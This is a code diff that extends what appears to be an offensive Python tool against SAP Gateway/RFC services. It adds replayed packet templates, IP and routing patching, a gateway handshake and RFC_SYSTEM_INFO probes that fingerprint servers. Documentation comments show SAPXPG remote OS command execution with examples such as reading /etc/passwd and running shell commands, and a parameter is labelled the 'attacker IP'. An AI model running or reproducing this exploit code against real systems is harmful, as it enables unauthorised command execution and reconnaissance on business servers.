+P3_RFCSI_NPL_TEMPLATE = bytes.fromhex(
+    "06030200ffffffff0000010000010000c1ffffffff06000000010175010087040000000000000000"
+    "3236313832383734000006cf00000002000006cf00000001000000000234313033020000ffff0002"
+    "d9c6c3f0f0f0f0f0f0f0f0f001010008050101050401000301010103000400000e1b01030106000b"
+    "04010003010302000000230106016000026041016001610001000161010500af312d302d322d3432"
+    "33382d332d302d342d312d352d31302e32302e33302e36352d362d736170677730302d372d31302e"
+    "32302e33302e332d31372d31302e32302e33302e36352d31382d31302e32302e33302e332d392d45"
+    "2d31302d302d31312d302d31322d302d31332d302d31342d312d31362d4134482d31352d30303031"
+    "324541393538314631464531393744353730423534413032393841322d382d4445534b544f502d54"
+    "46544c4d364c0001050007001e310030002e00320030002e00330030002e00360035002000200020"
+    "0020000007002000183100390032002e003100360038002e00370037002e00320000200021000430"
+    "003000002100180016310030002e00320030002e00330030002e0036003500001800080022760068"
+    "00630061006c00610034006800630069005f004100340048005f0030003000000800110002330000"
+    "11001300083700390033002000001300120008370035003800200000120006000c74006f005f004e"
+    "0050004c000006013000405200460043005f00530059005300540045004d005f0049004e0046004f"
+    "003d003d003d003d003d003d003d003d003d003d003d003d003d003d003d00460054000130011100"
+    "1244004500560045004c004f0050004500520001110114000630003000310001140117001409b890"
+    "9587759f2b74821d2a374a099567377072011700030006410034004800000301350014440045004d"
+    "004f00530059005300540045004d000135001000043000300000100002001476006800630061006c"
+    "00610034006800630069000002000c00085300450033003700000c0122001c320030003200360030"
+    "003600300032003100370035003700300033000122012300000123000e0006300030003100000e01"
+    "19001244004500560045004c004f005000450052000119014000246335e122ef4c56f6933f4f0dd5"
+    "f78a8d1d59772bfb7a8b58306ce55d7ed4b5c438d03b2e0140011400063000300031000114011500"
+    "02450001150009001244004500560045004c004f0050004500520000090134000630003000310001"
+    "3405010001010501013600250100012ea9581f1fe197d570b54a02b8a26a1e35f9dcd10bc5e10000"
+    "000a141e41000000010136050200000502000b0006370035003800000b0102001e5200460043005f"
+    "00530059005300540045004d005f0049004e0046004f000102000b0006370035003800000b013000"
+    "505200460043005f00530059005300540045004d005f0049004e0046004f003d003d003d003d003d"
+    "003d003d003d003d003d003d003d003d003d003d0046005400200020002000200020002000200020"
+    "000130050300000503013100e62a54482a0300e600004134482f766863616c61346863695f413448"
+    "5f303020202020202020202020200001444556454c4f504552202020202020202020202020202020"
+    "20202020202020205345333720202020202020202020202020202020202020202020202020202020"
+    "202020202020202000014134482f766863616c61346863695f4134485f3030202020202020202020"
+    "20203444443937434344364233393030303045303036413145444343433346463545303031000100"
+    "012ea9581f1fe197d570b54a02b8a26a1e35f9dcd10bc5e10000000a141e4100000000000000e22a"
+    "54482a013105140010f9351e6ad1dcc50be10000000a141e41051404200004000000000420051200"
+    "000512500100742448020300410300230040200000541143555252454e545f5245534f5552434553"
+    "540d464153545f5345525f5645525354044651484e54114d4158494d414c5f5245534f5552434553"
+    "54115245434f4d4d454e4445445f44454c4159540c52464353495f4558504f5254540753345f4841"
+    "4e414550010104011e100402000c000187680000044c00000bb810040b0020ff7ffa0d78b737def6"
+    "196e9325bf1597ef73feebdb51fd91ce3c2144000000001004040008001b00080012000810040d00"
+    "100000001b0000009700000028000000971004160002000c1004190002000010041e0008000002e9"
+    "000004ba10042500020001100409000338303010041d0002313210041f001557696e646f77732031"
+    "302e30202832363230302920100420000f494520392e31312e32363130302e3010042100084f6666"
+    "6963652030100424000800000430000006c71004280008000003dd000006c410042d000200001004"
+    "130034036a1e35ccdcd10bc5e10000000a141e41016a1e35f1dcd10bc5e10000000a141e41006a1e"
+    "35f6dcd10bc5e10000000a141e41000104ffff0000ffff0000000000000000000000000000000000"
+    "00000000000000006a1e35f9dcd10bc5e10000000a141e4100000001"
+)
+
 # Patch P3_TEMPLATE_ARGS capability flags to match P3_TEMPLATE_NOARGS and P2/P4.
 # All three pcap captures used consistent byte5 within each session (0x2c / 0x3c / 0x40).
 # Mixing byte5 values across P2/P3/P4 causes the server to return empty LOG output.
@@ -397,6 +1017,26 @@ del _p3a
 # Hardcoded PTEs baked into the templates (used as search patterns)
 _NOARGS_MAIN_PTE = bytes.fromhex('6993cc9468d00c3ee10000000a141e41')
 _ARGS_MAIN_PTE   = bytes.fromhex('6994dc03b3b00c7ee10000000a141e41')
+
+# RFC_SYSTEM_INFO probe PTEs (from rfc_system_info.pcapng, client IP = 10.20.30.15)
+# Note: _RFCSI_TH_PTE is hardcoded from the capture; the observed value has byte 0
+# = 0xde rather than the 0xdf that _compute_th_pte(_RFCSI_MAIN_PTE) would produce,
+# because the actual P2-response PTE (not shown in that capture) had byte 3 = 0xdd.
+_RFCSI_MAIN_PTE          = bytes.fromhex('6a19a5de923f0b87e10000000a141e0f')
+_RFCSI_TH_PTE            = bytes.fromhex('dea5196a3f92870be10000000a141e0f')
+_RFCSI_PTE_IP_SUFFIX_OLD = bytes.fromhex('e10000000a141e0f')
+
+# Hardcoded connection-info IPs in P3_RFCSI_TEMPLATE (from the capture session)
+_RFCSI_CONN_CLIENT_IP = b'10.20.30.15'
+_RFCSI_CONN_SERVER_IP = b'10.20.30.3'
+
+# RFC_SYSTEM_INFO NPL probe PTEs (from rfc_system_info_npl.pcapng, client = 10.20.30.65)
+# The 1-byte difference between _compute_th_pte(MAIN) and TH is the session-increment
+# pattern seen across all templates; the hardcoded TH is the empirical capture value.
+_RFCSI_NPL_MAIN_PTE          = bytes.fromhex('6a1e35f9dcd10bc5e10000000a141e41')
+_RFCSI_NPL_TH_PTE            = bytes.fromhex('f9351e6ad1dcc50be10000000a141e41')
+_RFCSI_NPL_PTE_IP_SUFFIX_OLD = bytes.fromhex('e10000000a141e41')
+_RFCSI_NPL_CONN_CLIENT_IP    = b'10.20.30.65'
 
 
 def _compute_th_pte(pte):
@@ -639,6 +1279,284 @@ _OLD_TH_ROUTING  = b'A4H/vhcala4hci_A4H_00' + b' ' * 11   # 32 bytes, space-padd
 _OLD_P2_TP_NAME  = b'A4H-SXPG'                             #  8 bytes
 _OLD_NPL_TP_NAME = b'npl-sxpg'                             #  8 bytes (ASCII in P2_NPL)
 
+def _patch_conn_info_rfcsi(pkt, client_ip, target_ip):
+    """Patch client/server IPs in the P3_RFCSI connection-info TLV (01 05 marker).
+
+    The template carries IPs from the capture session: client=10.20.30.15,
+    server=10.20.30.3.  Replaces both with the actual session IPs and updates
+    the 2-byte TLV length plus the CPIC size fields at offsets 48 and 56.
+
+    The byte sequence 01 05 also appears inside the CPIC capability flags earlier
+    in the packet; we skip any match whose 2-byte length field falls outside a
+    plausible range for a connection-info string (50–600 bytes).
+    """
+    old_client = _RFCSI_CONN_CLIENT_IP
+    old_server = _RFCSI_CONN_SERVER_IP
+    new_client = client_ip.encode('ascii') if client_ip else old_client
+    new_server = target_ip.encode('ascii') if target_ip else old_server
+
+    if new_client == old_client and new_server == old_server:
+        return pkt
+
+    data = bytes(pkt)
+    search_from = 0
+    marker_off = -1
+    old_str_len = 0
+    while True:
+        idx = data.find(b'\x01\x05', search_from)
+        if idx < 0 or idx + 4 > len(data):
+            return pkt
+        length = struct.unpack('>H', data[idx + 2:idx + 4])[0]
+        if 50 <= length <= 600:
+            marker_off = idx
+            old_str_len = length
+            break
+        search_from = idx + 1
+
+    len_off = marker_off + 2
+    str_start = marker_off + 4
+    str_end = str_start + old_str_len
+
+    old_str = bytes(pkt[str_start:str_end])
+    new_str = old_str.replace(old_client, new_client).replace(old_server, new_server)
+    if new_str == old_str:
+        return pkt
+
+    struct.pack_into('>H', pkt, len_off, len(new_str))
+    pkt[str_start:str_end] = new_str
+
+    cpic_delta = len(new_str) - old_str_len
+    if cpic_delta != 0:
+        for off in (48, 56):
+            old_v = struct.unpack('>I', bytes(pkt[off:off + 4]))[0]
+            struct.pack_into('>I', pkt, off, old_v + cpic_delta)
+
+    return pkt
+
+
+def _patch_rfcsi_routing(pkt, sid, appserver):
+    """Patch routing fields in a P3_RFCSI bytearray.
+
+    Replaces TH routing (length-neutral 32 bytes), the connection-info SID tag,
+    and the CPIC UTF-16 LE parameter block (instance name, SID, hostname).
+    CPIC size adjustments use offsets 48 and 56 (not end-8 as in SAPXPG templates).
+    """
+    # TH routing (ASCII, length-neutral)
+    new_th = _make_th_routing_padded(sid, appserver)
+    pkt = bytearray(bytes(pkt).replace(_OLD_TH_ROUTING, new_th))
+
+    # Connection-info SID tag (ASCII, length-neutral)
+    sid_b = sid[:3].encode('ascii')
+    pkt = bytearray(bytes(pkt).replace(b'-16-A4H-', b'-16-' + sid_b + b'-'))
+
+    # CPIC UTF-16 LE parameter block
+    cpic_delta = 0
+    pkt, d = _replace_utf16_field(pkt, 'vhcala4hci_A4H_00', f'{appserver}_{sid}_00')
+    cpic_delta += d
+    pkt, d = _replace_utf16_field(pkt, 'A4H', sid[:3])
+    cpic_delta += d
+    pkt, d = _replace_utf16_field(pkt, 'vhcala4hci', appserver)
+    cpic_delta += d
+
+    if cpic_delta != 0:
+        for off in (48, 56):
+            old_v = struct.unpack('>I', bytes(pkt[off:off + 4]))[0]
+            struct.pack_into('>I', pkt, off, old_v + cpic_delta)
+
+    return pkt
+
+
+def _patch_rfcsi_npl_routing(pkt, sid, appserver):
+    """Patch TH routing and CPIC UTF-16 fields in P3_RFCSI_NPL_TEMPLATE.
+
+    Identical to _patch_rfcsi_routing: adjusts CPIC size fields at offsets 48
+    and 56 (not end-8) when UTF-16 field lengths change.
+    """
+    pkt = bytearray(bytes(pkt).replace(_OLD_TH_ROUTING, _make_th_routing_padded(sid, appserver)))
+    pkt = bytearray(bytes(pkt).replace(b'-16-A4H-', b'-16-' + sid[:3].encode('ascii') + b'-'))
+
+    cpic_delta = 0
+    pkt, d = _replace_utf16_field(pkt, 'vhcala4hci_A4H_00', f'{appserver}_{sid}_00')
+    cpic_delta += d
+    pkt, d = _replace_utf16_field(pkt, 'A4H', sid[:3])
+    cpic_delta += d
+    pkt, d = _replace_utf16_field(pkt, 'vhcala4hci', appserver)
+    cpic_delta += d
+
+    if cpic_delta != 0:
+        for off in (48, 56):
+            old_v = struct.unpack('>I', bytes(pkt[off:off + 4]))[0]
+            struct.pack_into('>I', pkt, off, old_v + cpic_delta)
+
+    return pkt
+
+
+def build_rfcsi_direct(local_ip, target_ip, instance, hostname=None):
+    """Build a direct S/4→S/4 RFC_SYSTEM_INFO call packet (SAPMAP Method 1).
+
+    Replicates the exact server-to-server RFC call captured in
+    rfc_system_info.pcapng.  The routing string is assembled dynamically
+    with `target_ip` in field 7 so the gateway recognises itself as the
+    intended destination regardless of NAT.
+
+    No CHECK_GATEWAY handshake required — send this directly on a fresh TCP
+    connection and parse the response with parse_rfcsi_direct_response().
+
+    Returns the complete NI-framed packet (4-byte length prefix + payload).
+    """
+    import time as _time
+    import uuid as _uuid
+    import random as _random
+
+    if hostname is None:
+        hostname = socket.gethostname()
+
+    conn_id    = f'{_random.randint(10000000, 99999999)}'
+    route_uuid = _uuid.uuid4().hex.upper()
+    conn_uuid  = _uuid.uuid4().hex.upper()
+    gw_service = f'sapgw{int(instance):02d}'
+    timestamp  = _time.strftime('%Y%m%d%H%M%S')
+
+    # ── Patch header ─────────────────────────────────────────────────────────
+    header = bytearray(_RFCSI_DIRECT_HEADER)
+    header[_RSD_CONN_ID:_RSD_CONN_ID + 8] = conn_id.encode('ascii')
+
+    # ── Build routing string ──────────────────────────────────────────────────
+    # Field 7 = target_ip: tells the gateway the call is addressed to it,
+    # which is the key that makes the server return full RFCSI data even
+    # when connecting via a NAT/public IP address.
+    routing_parts = [
+        ('1',  '20'),
+        ('2',  '377'),
+        ('3',  '0'),
+        ('4',  '4'),
+        ('5',  local_ip),
+        ('6',  gw_service),
+        ('7',  target_ip),
+        ('17', local_ip),
+        ('18', target_ip),
+        ('9',  'E'),
+        ('10', '0'),
+        ('11', '0'),
+        ('12', '1413'),
+        ('13', '0'),
+        ('14', '1'),
+        ('16', 'WAS'),
+        ('15', route_uuid),
+        ('8',  hostname),
+    ]
+    routing_str = '-'.join(f'{k}-{v}' for k, v in routing_parts)
+
+    # ── Patch post-routing ────────────────────────────────────────────────────
+    post = bytearray(_RFCSI_DIRECT_POST)
+    post[_RSD_IP15:_RSD_IP15 + 15] = local_ip.encode('ascii').ljust(15)[:15]
+    post[_RSD_IP45:_RSD_IP45 + 45] = local_ip.encode('ascii').ljust(45)[:45]
+    post[_RSD_TIMESTAMP:_RSD_TIMESTAMP + 14] = timestamp.encode('ascii')
+
+    new_uuid_ascii = conn_uuid.encode('ascii')[:32]
+    post[_RSD_UUID_A1:_RSD_UUID_A1 + 32] = new_uuid_ascii
+    post[_RSD_UUID_A2:_RSD_UUID_A2 + 32] = new_uuid_ascii
+
+    new_uuid_bin = bytes.fromhex(conn_uuid[:32])
+    post[_RSD_UUID_B1:_RSD_UUID_B1 + 16] = new_uuid_bin
+    post[_RSD_UUID_B2:_RSD_UUID_B2 + 16] = new_uuid_bin
+
+    # ── Assemble ──────────────────────────────────────────────────────────────
+    payload = bytes(header) + routing_str.encode('ascii') + bytes(post)
+    return struct.pack('>I', len(payload)) + payload
+
+
+def build_rfcsi_s4h_probe(conv_id, pte, sid='A4H', appserver='vhcala4hci',
+                           client_ip=None, target_ip=None):
+    """Build an RFC_SYSTEM_INFO probe using the updated S/4HANA template.
+
+    From rfc_system_info_s4h.pcapng (10.20.30.15 → 20.31.218.163:3300).
+    Uses protocol version 1-15-2-21010 which is accepted by modern SAP
+    gateways (kernel 793+).  The older version 1-4-2-1041 is rejected with
+    TCP RST on current systems.
+
+    Patched fields: conv_id, PTEs, TH routing, source IP (ASCII + UTF-16 LE).
+    """
+    pkt = bytearray(P3_RFCSI_S4H_TEMPLATE)
+
+    pkt[40:48] = conv_id.encode()[:8].ljust(8, b'\x00')
+
+    pkt = bytearray(bytes(pkt).replace(_RFCSI_S4H_MAIN_PTE, pte))
+    pkt = bytearray(bytes(pkt).replace(_RFCSI_S4H_TH_PTE, _compute_th_pte(pte)))
+    pkt = bytearray(bytes(pkt).replace(_RFCSI_S4H_PTE_IP_SUFFIX_OLD,
+                                       bytes.fromhex('e1000000') + pte[12:16]))
+
+    pkt = _patch_rfcsi_routing(pkt, sid, appserver)
+
+    if client_ip:
+        # ASCII conn-info source IP (same offsets/mechanism as P3_RFCSI_TEMPLATE)
+        pkt = _patch_conn_info_rfcsi(pkt, client_ip, None)
+        # UTF-16 LE source IP in 01-05 sub-block (length-neutral for 11-char IPs)
+        old_u16 = _RFCSI_S4H_CONN_CLIENT_IP.decode('ascii').encode('utf-16-le')
+        new_u16 = client_ip.encode('utf-16-le')
+        if len(old_u16) == len(new_u16):
+            pkt = bytearray(bytes(pkt).replace(old_u16, new_u16))
+
+    return bytes(pkt)
+
+
+def parse_rfcsi_direct_response(data):
+    """Parse an RFC_SYSTEM_INFO response and return RFCSI_EXPORT as a dict.
+
+    Searches for the UTF-16LE RFCPROTO value "011" followed by a plausible
+    RFCCHARTYP value, then decodes all 20 RFCSI_EXPORT fields (245 chars =
+    490 bytes UTF-16LE).  RFCIPADDR is the 16th field (char offset 137).
+
+    To avoid false positives the candidate position is validated: the decoded
+    RFCPROTO must equal "011" and at least two other fields must contain
+    printable ASCII.  All matching positions are tried; the first valid
+    decode is returned.
+
+    Returns a dict of field→value, or {} if no valid match is found.
+    """
+    proto_marker = '011'.encode('utf-16-le')   # b'\x30\x00\x31\x00\x31\x00'
+    total_chars  = sum(f[1] for f in _RFCSI_FIELDS)   # 245
+    total_bytes  = total_chars * 2                     # 490
+
+    pos = 0
+    while True:
+        idx = data.find(proto_marker, pos)
+        if idx < 0:
+            return {}
+        pos = idx + 1
+
+        rfcsi_data = data[idx:idx + total_bytes]
+        if len(rfcsi_data) < total_bytes // 2:
+            continue
+
+        result = {}
+        off    = 0
+        for field_name, field_len in _RFCSI_FIELDS:
+            byte_len = field_len * 2
+            if off + byte_len > len(rfcsi_data):
+                break
+            raw = rfcsi_data[off:off + byte_len]
+            try:
+                value = raw.decode('utf-16-le').rstrip('\x00').strip()
+            except UnicodeDecodeError:
+                value = ''
+            if value:
+                result[field_name] = value
+            off += byte_len
+
+        # Validate: RFCPROTO must be "011" and RFCIPADDR must look like an IP
+        if result.get('RFCPROTO') != '011':
+            continue
+        rfcip = result.get('RFCIPADDR', '').replace('\x00', '').strip()
+        try:
+            socket.inet_aton(rfcip)
+            result['RFCIPADDR'] = rfcip   # normalised value
+            return result     # valid IPv4 found → good parse
+        except (OSError, ValueError):
+            continue           # false positive, keep searching
+    # unreachable
+
+
 # NI protocol constants
 NI_PING = b'NI_PING\x00'
 NI_PONG = b'NI_PONG\x00'
@@ -709,6 +1627,31 @@ def build_gw_init(client_ip, instance):
     return bytes(pkt)
 
 
+def build_gw_check(client_ip, instance):
+    """Build CHECK_GATEWAY (type 0x04, 64 bytes) — required before 06 03 CPIC calls.
+
+    The SAP Gateway requires this handshake to register the client as an RFC
+    peer.  Without it, the gateway silently closes the TCP connection when it
+    receives a direct CPIC (06 03) packet from an unrecognised source.
+    """
+    pkt = bytearray(64)
+    pkt[0] = 0x02                                           # version
+    pkt[1] = 0x04                                           # req_type = CHECK_GATEWAY
+    pkt[2:6] = socket.inet_aton(client_ip)
+    service = f'sapdp{instance}'.encode()[:10]
+    pkt[10:10+len(service)] = service
+    pkt[20:24] = b'4103'
+    pkt[29] = 0x0e
+    lu = b'sapserve'
+    pkt[30:30+len(lu)] = lu
+    tp = f'sapdp{instance}'.encode().ljust(16, b'\x20')
+    pkt[38:54] = tp[:16]
+    pkt[54] = 0x06
+    pkt[55] = 0xcb
+    pkt[56:58] = b'\xff\xff'
+    return bytes(pkt)
+
+
 def build_sap_init(template, client_ip, target_ip, sid='A4H'):
     """Build P2: F_SAP_INIT (template-based, IP + TP-name replacement).
 
@@ -757,8 +1700,10 @@ def build_sap_send_start(conv_id, cmd_str, pte, sid='A4H', appserver='vhcala4hci
     """Build P3: F_SAP_SEND START / SAPXPG_START_XPG_LONG.
 
     Selects template based on command structure:
-    - Single word, <= 6 chars: NOARGS template with space padding (delta=0)
-    - Everything else: ARGS template with full RFC counter patching
+    - Single word, <= 6 chars, no args: NOARGS template (zero packet-size delta)
+    - All other cases (program > 6 chars, has args, or full paths): ARGS template
+      with dynamic RFC counter patching; supports program names up to 255 bytes
+      and argument strings up to 255 bytes.
 
     Both templates share the same byte5/byte77 capability flags (patched at
     module init) so P2, P3, and P4 are always consistent.
@@ -768,6 +1713,13 @@ def build_sap_send_start(conv_id, cmd_str, pte, sid='A4H', appserver='vhcala4hci
     appserver -- Application server hostname used for TH routing
                  (default 'vhcala4hci').  The TH routing string becomes
                  '{sid}/{appserver}_{sid}_00', space-padded to 32 bytes.
+
+    Command examples (all supported):
+      'whoami'                           → NOARGS  (6 chars, no args)
+      'hostname'                         → ARGS    (8 chars, no args)
+      'cat /etc/passwd'                  → ARGS    (cmd=cat, args=/etc/passwd)
+      '/usr/sap/S4H/exe/dpmon'          → ARGS    (full path, no args)
+      '/bin/sh -c "id; uname -a"'       → ARGS    (shell wrapper with args)
     """
     parts = cmd_str.split(' ', 1)
     program = parts[0]
@@ -854,6 +1806,11 @@ def _build_p3_args(conv_id, program, args, pte, sid='A4H', appserver='vhcala4hci
     new_args = args.encode('ascii')
     new_cmd_len = len(new_cmd)
     new_args_len = len(new_args)
+
+    if new_cmd_len > 255:
+        raise ValueError(f'Program name too long ({new_cmd_len} bytes, max 255)')
+    if new_args_len > 255:
+        raise ValueError(f'Argument string too long ({new_args_len} bytes, max 255)')
 
     cmd_delta = new_cmd_len - TMPL_CMD_LEN
     args_delta = new_args_len - TMPL_ARGS_LEN
@@ -1044,6 +2001,87 @@ def build_sap_send_end_npl(conv_id, pte):
     return bytes(pkt)
 
 
+def build_rfcsi_probe(conv_id, pte, sid='A4H', appserver='vhcala4hci',
+                      client_ip=None, target_ip=None):
+    """Build the RFC_SYSTEM_INFO call packet (P3_RFCSI_TEMPLATE-based).
+
+    Patches conv_id, session PTEs, and the TH routing fields.  The ASCII
+    conn-info IPs are intentionally NOT patched to keep the CPIC size fields
+    unchanged from the capture (the gateway validates packet sizes).  The
+    UTF-16 client IP in the 01-05 sub-block IS patched (length-neutral) so the
+    source IP in the packet matches the actual TCP source.
+
+    pte        -- 16-byte session pointer (client-generated for direct CPIC).
+    sid        -- SAP System ID (3 chars, default 'A4H').
+    appserver  -- Application server hostname for TH routing.
+    client_ip  -- Actual client IP; replaces the template's source IP in the
+                  UTF-16 sub-block (only when the new IP has the same byte length).
+    target_ip  -- Unused here (kept for API compatibility).
+    """
+    pkt = bytearray(P3_RFCSI_TEMPLATE)
+
+    pkt[40:48] = conv_id.encode()[:8].ljust(8, b'\x00')
+
+    pkt = bytearray(bytes(pkt).replace(_RFCSI_MAIN_PTE, pte))
+    pkt = bytearray(bytes(pkt).replace(_RFCSI_TH_PTE, _compute_th_pte(pte)))
+    pkt = bytearray(bytes(pkt).replace(_RFCSI_PTE_IP_SUFFIX_OLD,
+                                       bytes.fromhex('e1000000') + pte[12:16]))
+
+    pkt = _patch_rfcsi_routing(pkt, sid, appserver)
+
+    # Patch the source (client) IP in both the ASCII conn-info string (fields 5
+    # and 17) and the UTF-16 LE sub-block.  The server IP field is left as the
+    # template value (10.20.30.3) so the CPIC sizes stay unchanged.
+    # For same-length IPs (e.g. 10.20.30.15 → 10.20.30.65, both 11 chars) the
+    # delta is 0 and _patch_conn_info_rfcsi makes no size adjustments; for
+    # different-length client IPs it adjusts the CPIC sizes at offsets 48/56.
+    if client_ip:
+        pkt = _patch_conn_info_rfcsi(pkt, client_ip, None)
+        old_u16 = _RFCSI_CONN_CLIENT_IP.decode('ascii').encode('utf-16-le')
+        new_u16 = client_ip.encode('utf-16-le')
+        if len(old_u16) == len(new_u16):
+            pkt = bytearray(bytes(pkt).replace(old_u16, new_u16))
+
+    return bytes(pkt)
+
+
+def build_rfcsi_npl_probe(conv_id, pte, sid='A4H', appserver='vhcala4hci',
+                           client_ip=None):
+    """Build the RFC_SYSTEM_INFO call packet (P3_RFCSI_NPL_TEMPLATE-based).
+
+    Uses the template captured from 10.20.30.65 → 192.168.77.2:3300 with a
+    preceding CHECK_GATEWAY handshake.  The gateway returns the server's own
+    RFCIPADDR at TLV 0x0007 (UTF-16 LE) in the initial 06 cb response.
+
+    Must be sent after build_gw_check() on the same TCP connection.
+
+    pte       -- 16-byte client-generated session pointer (e1000000 + client IP).
+    sid       -- SAP System ID (3 chars, default 'A4H').
+    appserver -- Application server hostname for TH routing.
+    client_ip -- Attacker IP; patches ASCII conn-info fields 5 and 17.
+    """
+    pkt = bytearray(P3_RFCSI_NPL_TEMPLATE)
+
+    pkt[40:48] = conv_id.encode()[:8].ljust(8, b'\x00')
+
+    pkt = bytearray(bytes(pkt).replace(_RFCSI_NPL_MAIN_PTE, pte))
+    pkt = bytearray(bytes(pkt).replace(_RFCSI_NPL_TH_PTE, _compute_th_pte(pte)))
+    pkt = bytearray(bytes(pkt).replace(_RFCSI_NPL_PTE_IP_SUFFIX_OLD,
+                                       bytes.fromhex('e1000000') + pte[12:16]))
+
+    pkt = _patch_rfcsi_npl_routing(pkt, sid, appserver)
+
+    if client_ip:
+        # ASCII conn-info fields 5 and 17 (length-neutral for same-length IPs)
+        pkt = _patch_conn_info_rfcsi(pkt, client_ip, None)
+        old_u16 = _RFCSI_NPL_CONN_CLIENT_IP.decode('ascii').encode('utf-16-le')
+        new_u16 = client_ip.encode('utf-16-le')
+        if len(old_u16) == len(new_u16):
+            pkt = bytearray(bytes(pkt).replace(old_u16, new_u16))
+
+    return bytes(pkt)
+
+
 # ============================================================================
 # Response Parsing
 # ============================================================================
@@ -1067,6 +2105,7 @@ def extract_p2_info(response):
     if not conv_id.strip('\x00'):
         raise ValueError("Empty conv_id in INIT response")
     pte = bytes(response[105:121])
+    # pte[12:16] = client IP (session identifier), NOT the server's own IP.
     return conv_id, pte
 
 
@@ -1098,12 +2137,11 @@ def _extract_compressed(response, marker_idx, debug=False):
       [10:]  - SAP compressed stream:
                [4-byte LE uncomp_len][1-byte algo=0x12][LZH data...]
 
-    pysapcompress.decompress(sap_stream, uncomp_len) is called directly on the
-    SAP stream (which already contains the length/algo header).  No prepending
-    needed.  Each decompressed row = 256 bytes CHAR(128) UTF-16 LE.
+    The SAP LZH decompressor is called directly on the SAP stream (which already
+    contains the length/algo header).  No prepending needed.
+    Each decompressed row = 256 bytes CHAR(128) UTF-16 LE.
     """
-    if not _HAS_PYSAPCOMPRESS:
-        return None
+    # (decompressor always available — built-in pure Python)
 
     block_start = marker_idx + 4  # skip the 4-byte marker
     if block_start + 10 > len(response):
@@ -1157,7 +2195,7 @@ def extract_output(response, debug=False):
       03 02 03 03 - uncompressed: each row is [2-byte header][256 bytes CHAR(128)]
                    with 4-byte inter-row separators between rows
       03 02 03 05 - SAP LZH compressed: 14-byte block header followed by
-                   pysapcompress LZH blob; requires pysapcompress library
+                   SAP LZH blob; decompressed using the built-in pure-Python engine
     """
     # --- Uncompressed format ---
     marker = b'\x03\x02\x03\x03'
@@ -1195,6 +2233,140 @@ def extract_output(response, debug=False):
     if idx >= 0:
         return _extract_compressed(response, idx, debug=debug)
 
+    return None
+
+
+def parse_rfcsi_ipaddr(response):
+    """Extract RFCIPADDR from an RFC_SYSTEM_INFO response.
+
+    The RFCSI_EXPORT structure serialises string fields as:
+        0x43  [1-byte length]  0x80  [ASCII string bytes]
+
+    RFCIPADDR is a 7-15 character IPv4 dotted-decimal string.  We scan for
+    all 0x43/0x80 string fields with a plausible IP length and return the
+    first one that passes socket.inet_aton() validation.
+
+    Returns a dotted-decimal IP string, or None if not found.
+    """
+    data = bytes(response)
+    for i in range(len(data) - 3):
+        if data[i] != 0x43:
+            continue
+        length = data[i + 1]
+        if not (7 <= length <= 15) or data[i + 2] != 0x80:
+            continue
+        candidate = data[i + 3: i + 3 + length]
+        try:
+            ip_str = candidate.decode('ascii')
+            socket.inet_aton(ip_str)
+            return ip_str
+        except (UnicodeDecodeError, OSError):
+            continue
+    return None
+
+
+def _decompress_06cb_payload(data, _verbose=False):
+    """Attempt SAP LZH decompression of a compressed 06 cb CPIC response.
+
+    Searches for the standard SAP LZH stream header in the range 0x48-0x84:
+        [4-byte LE uncompressed_length][1-byte algorithm=0x12][LZH data...]
+
+    Returns the decompressed bytes, or the original data on failure.
+    """
+    # (decompressor always available — built-in pure Python)
+    for off in range(0x48, min(len(data) - 8, 0x84)):
+        if data[off + 4] != 0x12:
+            continue
+        uncomp_len = struct.unpack('<I', data[off:off + 4])[0]
+        if not (100 < uncomp_len < 0x200000):
+            continue
+        try:
+            _rc, _out_len, decompressed = _sap_decompress(data[off:], uncomp_len)
+            if decompressed and len(decompressed) > 10:
+                return decompressed
+        except Exception as e:
+            if _verbose:
+                print(f'[DBG] SAP LZH decompress @ 0x{off:02x}: {type(e).__name__}: {e}',
+                      file=sys.stderr)
+            continue
+    return data
+
+
+def parse_06cb_server_ip(response, _verbose=False, _debug=False):
+    """Extract the server's own IPv4 from a 06 cb response.
+
+    Tries two encodings against the (possibly decompressed) payload:
+
+    1. TLV 0x0007 — UTF-16 LE space-padded string returned in the CPIC
+       capability header of the initial 06 cb response (e.g. NPL/NW752).
+       Format: [0x00 0x07][2-byte BE length][UTF-16 LE data]
+
+    2. RFCSI_EXPORT RFCIPADDR — plain ASCII string returned in the RFC body
+       when the called function is RFC_SYSTEM_INFO (e.g. modern S/4HANA).
+       Format: [0x43][1-byte length][0x80][ASCII data]  (see parse_rfcsi_ipaddr)
+
+    When the CPIC payload is SAP LZH compressed, _decompress_06cb_payload
+    decompresses it first (uses embedded pure-Python SAP LZH decompressor).
+
+    Returns the stripped IPv4 string, or None if not found.
+    """
+    data = bytes(response)
+
+    # Always attempt decompression — no-op if the SAP LZH marker is absent
+    data = _decompress_06cb_payload(data, _verbose=_debug)
+    if _debug and len(data) != len(response):
+        print(f'[DBG] Decompressed {len(response)} → {len(data)} bytes')
+        print(f'[DBG] Decompressed first 80 bytes: {data[:80].hex()}')
+        # Dump all 0x0007 occurrences to find actual TLV lengths
+        hits = [(i, struct.unpack('>H', data[i+2:i+4])[0])
+                for i in range(len(data)-5) if data[i:i+2] == b'\x00\x07']
+        print(f'[DBG] All 0x0007 occurrences ({len(hits)} total):')
+        for off, length in hits[:15]:
+            snippet = data[off+4:off+4+min(length, 20)].hex()
+            print(f'[DBG]   0x{off:04x}: len={length} data={snippet}')
+        # Also look for any ASCII IPs already in data
+        import re as _re
+        flat = bytes(b if 32 <= b < 127 else 0 for b in data)
+        ascii_ips = list(dict.fromkeys(
+            m.group(0).decode() for m in _re.finditer(rb'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', flat)
+        ))
+        print(f'[DBG] ASCII IPs in decompressed: {ascii_ips[:10]}')
+
+    # ── Method 1: TLV 0x0007  (UTF-16 LE, CPIC capability header) ─────────
+    for i in range(len(data) - 5):
+        if data[i:i + 2] != b'\x00\x07':
+            continue
+        length = struct.unpack('>H', data[i + 2:i + 4])[0]
+        if not (14 <= length <= 30 and length % 2 == 0):
+            continue
+        ip_bytes = data[i + 4:i + 4 + length]
+        try:
+            ip_str = ip_bytes.decode('utf-16-le').rstrip('\x00 ')
+            socket.inet_aton(ip_str)
+            return ip_str
+        except (UnicodeDecodeError, OSError):
+            continue
+
+    # ── Method 2: RFCSI_EXPORT RFCIPADDR  (ASCII, RFC_SYSTEM_INFO body) ────
+    ip = parse_rfcsi_ipaddr(data)
+    if ip:
+        return ip
+
+    # ── Method 3: raw ASCII IPv4 scan  (handles any serialisation format) ──
+    # Flatten non-printable bytes to null, then regex-scan for dotted-decimal.
+    # Skip loopback, unspecified, the client's own IP, and multicast/broadcast.
+    import re
